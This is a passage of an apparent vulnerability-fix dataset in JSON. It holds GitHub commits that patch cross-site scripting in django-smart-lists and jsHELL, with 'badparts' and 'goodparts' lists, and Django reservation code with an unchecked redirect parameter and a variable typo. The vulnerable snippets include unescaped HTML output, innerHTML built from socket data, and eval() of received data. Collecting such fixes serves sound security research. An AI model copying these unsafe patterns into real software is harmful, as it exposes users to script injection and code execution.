Article.objects.get(id=aid)\n        ar.RID = current_reservation\n        if \"srid\" in request.GET:\n            ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n        ar.amount = quantity\n        ar.notes = notes\n        ar.save()\n    # Actual adding of multiple articles\n    else:\n        if \"group_id\" not in request.GET:\n            return HttpResponseRedirect(\"/admin?error=missing%20group%20id\")\n        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[\"group_id\"]))\n        for art in Article.objects.all().filter(group=g):\n            if str(\"quantity_\" + str(art.id)) not in request.POST or str(\"notes_\" + str(art.id)) not in request.POST:\n                return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\")\n            amount = int(request.POST[\"quantity_\" + str(art.id)])\n            if amount > 0:\n                ar = ArticleRequested()\n                ar.AID = art\n                ar.RID = current_reservation\n                ar.amount = amount\n                if \"srid\" in request.GET:\n                    ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n                ar.save()\n    if \"srid\" in request.GET:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n    else:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id))\n    return response\n\n\ndef write_db_reservation_action(request: HttpRequest):\n    \"\"\"\n    This function is used to submit the reservation\n    \"\"\"\n    u: Profile = get_current_user(request)\n    forward_url = \"/admin?success\"\n    if u.rights > 0:\n        forward_url = \"/admin/reservations\"\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"payload\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=No%20id%20provided\")\n    current_reservation = GroupReservation.objects.get(id=int(request.GET[\"payload\"]))\n    if current_reservation.createdByUser != u and u. rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    current_reservation.submitted = True\n    current_reservation.save()\n    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)\n    return res\n\n\ndef manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):\n    \"\"\"\n    This function is used to alter the reservation beeing build inside\n    a cookie. This function automatically crafts the required response.\n    \"\"\"\n    js_string: str = \"\"\n    r: GroupReservation = None\n    u: Profile = get_current_user(request)\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"srid\" in request.GET:\n        if not request.GET.get(\"rid\"):\n            return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\")\n        srid: int = int(request.GET[\"srid\"])\n        sr: SubReservation = None\n        if srid == 0:\n            sr = SubReservation()\n        else:\n            sr = SubReservation.objects.get(id=srid)\n        if request.POST.get(\"notes\"):\n            sr.notes = request.POST[\"notes\"]\n        else:\n            sr.notes = \" \"\n        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        sr.save()\n        print(request.POST)\n        print(sr.notes)\n        return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \"&srid=\" + str(sr.id))\n    if \"rid\" in request.GET:\n        # update reservation\n        r = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():\n        r = GroupReservation()\n        r.createdByUser = u\n        r.ready = False\n        r.open = True\n        r.pickupDate = datetime.datetime.now()\n    else:\n        return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n    if request.POST.get(\"notes\"):\n        r.notes = request.POST[\"notes\"]\n    if request.POST.get(\"contact\"):\n        r.responsiblePerson = str(request.POST[\"contact\"])\n    if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n        r.save()\n    else:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + \"?rid=\" + str(r.id))\n    return response\n\n\ndef action_delete_article(request: HttpRequest):\n    \"\"\"\n    This function removes an article from the reservation and returnes\n    the required resonse.\n    \"\"\"\n    u: Profile = get_current_user(request)\n    if \"rid\" in request.GET:\n        if \"srid\" in request.GET:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \\\n                    '&srid=' + str(int(request.GET['srid'])))\n        else:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])))\n    else:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    if request.GET.get(\"id\"):\n        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[\"id\"]))\n        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:\n            aid.delete()\n        else:\n            return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\")\n    return response\n"
                }
            },
            "msg": "fix: XSS bug in now exposed user forms"
        }
    },
    "https://github.com/plecto/django-smart-lists": {
        "44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3": {
            "url": "https://api.github.com/repos/plecto/django-smart-lists/commits/44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3",
            "html_url": "https://github.com/plecto/django-smart-lists/commit/44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3",
            "message": "fix XSS vulnerability in render_function",
            "sha": "44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3",
            "keyword": "XSS fix",
            "diff": "diff --git a/smart_lists/helpers.py b/smart_lists/helpers.py\nindex d31b54b..eb10798 100644\n--- a/smart_lists/helpers.py\n+++ b/smart_lists/helpers.py\n@@ -49,12 +49,18 @@ def __init__(self, smart_list_item, column, object):\n         self.object = object\n \n     def get_value(self):\n-        if self.column.render_function:\n-            # We don't want to escape our html\n-            return self.column.render_function(self.object)\n-\n         field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n-        if type(self.object) == dict:\n+        if self.column.render_function:\n+            template = self.column.render_function(self.object)\n+            if not self.is_template_instance(template):\n+                raise SmartListException(\n+                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(\n+                        self.column.render_function.__name__,\n+                        type(template),\n+                    )\n+                )\n+            value = template.render()\n+        elif type(self.object) == dict:\n             value = self.object.get(self.column.field_name)\n         elif callable(field):\n             value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n@@ -62,7 +68,20 @@ def get_value(self):\n             display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n             value = display_function() if display_function else field\n \n-        return escape(value)\n+        return value\n+\n+    def is_template_instance(self, obj):\n+        \"\"\"Check if given object is object of Template.\"\"\"\n+        from django.template import Template as Template\n+        from django.template.backends.django import Template as DjangoTemplate\n+        from django.template.backends.jinja2 import Template as Jinja2Template\n+\n+        return (\n+            isinstance(obj, Template)\n+            or isinstance(obj, DjangoTemplate)\n+            or isinstance(obj, Jinja2Template)\n+        )\n+\n \n     def format(self, value):\n         if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\ndiff --git a/smart_lists/templates/smart_lists/smart_list.html b/smart_lists/templates/smart_lists/smart_list.html\nindex 6be5cb9..bde853b 100644\n--- a/smart_lists/templates/smart_lists/smart_list.html\n+++ b/smart_lists/templates/smart_lists/smart_list.html\n@@ -53,7 +53,7 @@\n                         {% if forloop.first %}\n                             <a href=\"{{ field.object.get_absolute_url }}\" class=\"{{ table_link_class }}\">{{ field.get_value }}</a>\n                         {% else %}\n-                            {{ field.get_value|safe }}\n+                            {{ field.get_value }}\n                         {% endif %}\n                     </td>\n                     {% endfor %}\n",
            "files": {
                "/smart_lists/helpers.py": {
                    "changes": [
                        {
                            "diff": "\n         self.object = object\n \n     def get_value(self):\n-        if self.column.render_function:\n-            # We don't want to escape our html\n-            return self.column.render_function(self.object)\n-\n         field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n-        if type(self.object) == dict:\n+        if self.column.render_function:\n+            template = self.column.render_function(self.object)\n+            if not self.is_template_instance(template):\n+                raise SmartListException(\n+                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(\n+                        self.column.render_function.__name__,\n+                        type(template),\n+                    )\n+                )\n+            value = template.render()\n+        elif type(self.object) == dict:\n             value = self.object.get(self.column.field_name)\n         elif callable(field):\n             value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n",
                            "add": 11,
                            "remove": 5,
                            "filename": "/smart_lists/helpers.py",
                            "badparts": [
                                "        if self.column.render_function:",
                                "            return self.column.render_function(self.object)",
                                "        if type(self.object) == dict:"
                            ],
                            "goodparts": [
                                "        if self.column.render_function:",
                                "            template = self.column.render_function(self.object)",
                                "            if not self.is_template_instance(template):",
                                "                raise SmartListException(",
                                "                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(",
                                "                        self.column.render_function.__name__,",
                                "                        type(template),",
                                "                    )",
                                "                )",
                                "            value = template.render()",
                                "        elif type(self.object) == dict:"
                            ]
                        },
                        {
                            "diff": "\n             display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n             value = display_function() if display_function else field\n \n-        return escape(value)\n+        return value\n+\n+    def is_template_instance(self, obj):\n+        \"\"\"Check if given object is object of Template.\"\"\"\n+        from django.template import Template as Template\n+        from django.template.backends.django import Template as DjangoTemplate\n+        from django.template.backends.jinja2 import Template as Jinja2Template\n+\n+        return (\n+            isinstance(obj, Template)\n+            or isinstance(obj, DjangoTemplate)\n+            or isinstance(obj, Jinja2Template)\n+        )\n+\n \n     def format(self, value):\n         if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):",
                            "add": 14,
                            "remove": 1,
                            "filename": "/smart_lists/helpers.py",
                            "badparts": [
                                "        return escape(value)"
                            ],
                            "goodparts": [
                                "        return value",
                                "    def is_template_instance(self, obj):",
                                "        \"\"\"Check if given object is object of Template.\"\"\"",
                                "        from django.template import Template as Template",
                                "        from django.template.backends.django import Template as DjangoTemplate",
                                "        from django.template.backends.jinja2 import Template as Jinja2Template",
                                "        return (",
                                "            isinstance(obj, Template)",
                                "            or isinstance(obj, DjangoTemplate)",
                                "            or isinstance(obj, Jinja2Template)",
                                "        )"
                            ]
                        }
                    ],
                    "source": "\nimport datetime from django.core.exceptions import FieldDoesNotExist from django.db.models import BooleanField, ForeignKey from django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation import gettext_lazy as _ from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field, 'short_description', False): return field.short_description return self.field_name.replace(\"_\", \" \").title() class QueryParamsMixin(object): def get_url_with_query_params(self, new_query_dict): query=dict(self.query_params).copy() for key, value in query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr(field, 'do_not_call_in_templates', False) else field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format(self, value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return value def render(self): return format_html( '<td>{}</td>', self.format(self.get_value()) ) def render_link(self): if not hasattr(self.object, 'get_absolute_url'): raise SmartListException(\"Please make sure your model{} implements get_absolute_url()\".format(type(self.object))) return format_html( '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value()) ) class SmartListItem(object): def __init__(self, smart_list, object): self.smart_list=smart_list self.object=object def fields(self): return[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param): self.query_params=query_params self.column_id=column_id self.ordering_query_param=ordering_query_param self.query_order=query_params.get(ordering_query_param) self.current_columns=[int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else[] self.current_columns_length=len(self.current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): return True return False def get_add_sort_by(self): if not self.is_ordered(): if self.query_order: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_reverse_sort_by() def get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) class SmartColumn(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model=model self.field_name=field self.label=label self.render_function=render_function self.order_field=None self.order=None if not self.field_name: return if self.field_name.startswith(\"_\") and self.field_name !=\"__str__\": raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field(self.field_name) self.order_field=self.field_name except FieldDoesNotExist: self.model_field=None try: field=getattr(self.model, self.field_name) if callable(field) and getattr(field, 'admin_order_field', False): self.order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue(QueryParamsMixin, object): def __init__(self, field_name, label, value, query_params): self.field_name=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value }) def is_active(self): if self.field_name in self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None: return True return False class SmartFilter(TitleFromModelFieldMixin, object): def __init__(self, model, field, query_params, object_list): self.model=model if isinstance(field, SmartListFilter): self.field_name=field.parameter_name self.model_field=field else: self.field_name=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title(self): if isinstance(self.model_field, SmartListFilter): return self.model_field.title return super(SmartFilter, self).get_title() def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups() ] elif self.model_field.choices: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices ] elif type(self.model_field)==BooleanField: values=[ SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True) remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs ] return[SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param=None): self.object_list=object_list self.model=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get(search_query_param, '') self.search_query_param=search_query_param self.ordering_query_value=self.query_params.get(ordering_query_param, '') self.ordering_query_param=ordering_query_param self.columns=self.get_columns() self.filters=[ SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1) ] if self.list_filter else[] def get_columns(self): \"\"\" Transform list_display into list of SmartColumns In list_display we expect: 1. name of the field(string) or 2. two element iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index, field in enumerate(self.list_display, start=1): kwargs={ 'model': self.model, 'column_id': index, 'query_params': self.query_params, 'ordering_query_param': self.ordering_query_param, } try: field, label=field except(TypeError, ValueError): kwargs['field']=field else: if callable(field): kwargs['field'], kwargs['render_function'], kwargs['label']=None, field, label else: kwargs['field'], kwargs['label']=field, label columns.append(SmartColumn(**kwargs)) return columns @property def items(self): return[ SmartListItem(self, obj) for obj in self.object_list ] ",
                    "sourceWithComments": "import datetime\n\nfrom django.core.exceptions import FieldDoesNotExist\nfrom django.db.models import BooleanField, ForeignKey\nfrom django.utils.formats import localize\nfrom django.utils.html import format_html, escape\nfrom django.utils.http import urlencode\nfrom django.utils.translation import gettext_lazy as _\nfrom typing import List\n\nfrom smart_lists.exceptions import SmartListException\nfrom smart_lists.filters import SmartListFilter\n\n\nclass TitleFromModelFieldMixin(object):\n    def get_title(self):\n        if self.label:\n            return self.label\n        elif self.model_field:\n            return self.model_field.verbose_name.title()\n        elif self.field_name == '__str__':\n            return self.model._meta.verbose_name.title()\n        try:\n            field = getattr(self.model, self.field_name)\n        except AttributeError as e:\n            return self.field_name.title()\n        if callable(field) and getattr(field, 'short_description', False):\n            return field.short_description\n        return self.field_name.replace(\"_\", \" \").title()\n\n\nclass QueryParamsMixin(object):\n    def get_url_with_query_params(self, new_query_dict):\n        query = dict(self.query_params).copy()\n        for key, value in query.items():\n            if type(value) == list:\n                query[key] = value[0]\n        query.update(new_query_dict)\n        for key, value in query.copy().items():\n            if value is None:\n                del query[key]\n        return '?{}'.format(urlencode(query))\n\n\nclass SmartListField(object):\n    def __init__(self, smart_list_item, column, object):\n        self.smart_list_item = smart_list_item\n        self.column = column\n        self.object = object\n\n    def get_value(self):\n        if self.column.render_function:\n            # We don't want to escape our html\n            return self.column.render_function(self.object)\n\n        field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n        if type(self.object) == dict:\n            value = self.object.get(self.column.field_name)\n        elif callable(field):\n            value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n        else:\n            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n            value = display_function() if display_function else field\n\n        return escape(value)\n\n    def format(self, value):\n        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\n            return localize(value)\n        return value\n\n    def render(self):\n        return format_html(\n            '<td>{}</td>', self.format(self.get_value())\n        )\n\n    def render_link(self):\n        if not hasattr(self.object, 'get_absolute_url'):\n            raise SmartListException(\"Please make sure your model {} implements get_absolute_url()\".format(type(self.object)))\n        return format_html(\n            '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())\n        )\n\n\nclass SmartListItem(object):\n    def __init__(self, smart_list, object):\n        self.smart_list = smart_list\n        self.object = object\n\n    def fields(self):\n        return [\n            SmartListField(self, column, self.object) for column in self.smart_list.columns\n        ]\n\n\nclass SmartOrder(QueryParamsMixin, object):\n    def __init__(self, query_params, column_id, ordering_query_param):\n        self.query_params = query_params\n        self.column_id = column_id\n        self.ordering_query_param = ordering_query_param\n        self.query_order = query_params.get(ordering_query_param)\n        self.current_columns = [int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else []\n        self.current_columns_length = len(self.current_columns)\n\n    @property\n    def priority(self):\n        if self.is_ordered():\n            return self.current_columns.index(self.column_id) + 1\n\n    def is_ordered(self):\n        return self.column_id in self.current_columns\n\n    def is_reverse(self):\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    return True\n        return False\n\n    def get_add_sort_by(self):\n        if not self.is_ordered():\n            if self.query_order:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: self.column_id\n                })\n        elif self.current_columns_length > 1:\n            new_query = []\n            for column in self.query_order.split('.'):\n                c = column.replace(\"-\", \"\")\n                if not int(c) == self.column_id:\n                    new_query.append(column)\n            if not self.is_reverse() and self.current_columns[0] == self.column_id:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n\n        else:\n            return self.get_reverse_sort_by()\n\n    def get_remove_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if not int(c) == self.column_id:\n                new_query.append(column)\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n    def get_reverse_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    new_query.append(c)\n                else:\n                    new_query.append('-{}'.format(c))\n            else:\n                new_query.append(column)\n\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n\nclass SmartColumn(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):\n        self.model = model\n        self.field_name = field\n        self.label = label\n        self.render_function = render_function\n        self.order_field = None\n        self.order = None\n\n        # If there is no field_name that means it is not bound to any model field\n        if not self.field_name:\n            return\n\n        if self.field_name.startswith(\"_\") and self.field_name != \"__str__\":\n            raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\")\n        try:\n            self.model_field = self.model._meta.get_field(self.field_name)\n            self.order_field = self.field_name\n        except FieldDoesNotExist:\n            self.model_field = None\n            try:\n                field = getattr(self.model, self.field_name)\n                if callable(field) and getattr(field, 'admin_order_field', False):\n                    self.order_field = getattr(field, 'admin_order_field')\n                if callable(field) and getattr(field, 'alters_data', False):\n                    raise SmartListException(\"Cannot use a function that alters data in smart list\")\n            except AttributeError:\n                self.order_field = self.field_name\n                pass  # This is most likely a .values() query set\n\n        if self.order_field:\n            self.order = SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param)\n\n\nclass SmartFilterValue(QueryParamsMixin, object):\n    def __init__(self, field_name, label, value, query_params):\n        self.field_name = field_name\n        self.label = label\n        self.value = value\n        self.query_params = query_params\n\n    def get_title(self):\n        return self.label\n\n    def get_url(self):\n        return self.get_url_with_query_params({\n            self.field_name: self.value\n        })\n\n    def is_active(self):\n        if self.field_name in self.query_params:\n            selected_value = self.query_params[self.field_name]\n            if type(selected_value) == list:\n                selected_value = selected_value[0]\n            if selected_value == self.value:\n                return True\n        elif self.value is None:\n            return True\n        return False\n\n\nclass SmartFilter(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, query_params, object_list):\n        self.model = model\n\n        # self.model_field = None\n        if isinstance(field, SmartListFilter):\n            self.field_name = field.parameter_name\n            self.model_field = field\n        else:\n            self.field_name = field\n            self.model_field = self.model._meta.get_field(self.field_name)\n        self.query_params = query_params\n        self.object_list = object_list\n\n    def get_title(self):\n        if isinstance(self.model_field, SmartListFilter):\n            return self.model_field.title\n        return super(SmartFilter, self).get_title()\n\n    def get_values(self):\n        values = []\n        if isinstance(self.model_field, SmartListFilter):\n            values = [\n                SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice in self.model_field.lookups()\n            ]\n        elif self.model_field.choices:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in self.model_field.choices\n            ]\n        elif type(self.model_field) == BooleanField:\n            values = [\n                SmartFilterValue(self.field_name, choice[1], choice[0], self.query_params) for choice in (\n                    (1, _('Yes')),\n                    (0, _('No'))\n                )\n            ]\n        elif issubclass(type(self.model_field), ForeignKey):\n            pks = self.object_list.order_by().distinct().values_list('%s__pk' % self.field_name, flat=True)\n            remote_field = self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field\n            qs = remote_field.model.objects.filter(pk__in=pks)\n            values = [\n                SmartFilterValue(self.field_name, obj, str(obj.pk), self.query_params) for obj in qs\n            ]\n\n        return [SmartFilterValue(self.field_name, _(\"All\"), None, self.query_params)] + values\n\n\nclass SmartList(object):\n    def __init__(self, object_list, query_params=None, list_display=None, list_filter=None,\n                 list_search=None, search_query_param=None, ordering_query_param=None):\n        self.object_list = object_list\n        self.model = object_list.model\n        self.query_params = query_params or {}\n        self.list_display = list_display or []\n        self.list_filter = list_filter or []\n        self.list_search = list_search or []\n        self.search_query_value = self.query_params.get(search_query_param, '')\n        self.search_query_param = search_query_param\n        self.ordering_query_value = self.query_params.get(ordering_query_param, '')\n        self.ordering_query_param = ordering_query_param\n\n        self.columns = self.get_columns()\n\n        self.filters = [\n            SmartFilter(self.model, field, self.query_params, self.object_list) for i, field in enumerate(self.list_filter, start=1)\n        ] if self.list_filter else []\n\n    def get_columns(self):  # type: () -> List[SmartColumn]\n        \"\"\"\n        Transform list_display into list of SmartColumns\n        In list_display we expect:\n         1. name of the field (string)\n         or\n         2. two element iterable in which:\n            - first element is name of the field (string) or callable\n              which returns html\n            - label for the column (string)\n        \"\"\"\n\n        if not self.list_display:\n            return [SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)]\n\n        columns = []\n        for index, field in enumerate(self.list_display, start=1):\n            kwargs = {\n                'model': self.model,\n                'column_id': index,\n                'query_params': self.query_params,\n                'ordering_query_param': self.ordering_query_param,\n            }\n\n            try:\n                field, label = field\n            except (TypeError, ValueError):\n                kwargs['field'] = field\n            else:\n                if callable(field):\n                    kwargs['field'], kwargs['render_function'], kwargs['label'] = None, field, label\n                else:\n                    kwargs['field'], kwargs['label'] = field, label\n            columns.append(SmartColumn(**kwargs))\n        return columns\n\n    @property\n    def items(self):\n        return [\n            SmartListItem(self, obj) for obj in self.object_list\n        ]\n"
                }
            },
            "msg": "fix XSS vulnerability in render_function"
        }
    },
    "https://github.com/rakeshmane/jsHELL": {
        "88448ebe525815e97ee6724c428be88a638b5bb6": {
            "url": "https://api.github.com/repos/rakeshmane/jsHELL/commits/88448ebe525815e97ee6724c428be88a638b5bb6",
            "html_url": "https://github.com/rakeshmane/jsHELL/commit/88448ebe525815e97ee6724c428be88a638b5bb6",
            "message": "Fix XSS + Removed Unused Libraries",
            "sha": "88448ebe525815e97ee6724c428be88a638b5bb6",
            "keyword": "XSS fix",
            "diff": "diff --git a/jsHELL.py b/jsHELL.py\nindex a1c16a9..8f3b6b9 100644\n--- a/jsHELL.py\n+++ b/jsHELL.py\n@@ -1,5 +1,5 @@\n from flask_socketio import SocketIO,emit\n-from flask import Flask, render_template, session,request,flash,redirect,url_for\n+from flask import Flask\n import sys\n \n if len(sys.argv)<3:\n@@ -34,7 +34,7 @@\n     catch{}\n \n     socket.on('getMSG',function(data){\n-        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n+        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";\n         try{\n              output=eval(data)+\"\"\n         }\n",
            "files": {
                "/jsHELL.py": {
                    "changes": [
                        {
                            "diff": "\n from flask_socketio import SocketIO,emit\n-from flask import Flask, render_template, session,request,flash,redirect,url_for\n+from flask import Flask\n import sys\n \n if len(sys.argv)<3:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/jsHELL.py",
                            "badparts": [
                                "from flask import Flask, render_template, session,request,flash,redirect,url_for"
                            ],
                            "goodparts": [
                                "from flask import Flask"
                            ]
                        },
                        {
                            "diff": "     catch{}\n \n     socket.on('getMSG',function(data){\n-        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";\n+        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";\n         try{\n              output=eval(data)+\"\"\n         }\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/jsHELL.py",
                            "badparts": [
                                "        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data+\"]</font>\";"
                            ],
                            "goodparts": [
                                "        document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black> [\"+data.replace(/</g,\"\")+\"]</font>\";"
                            ]
                        }
                    ],
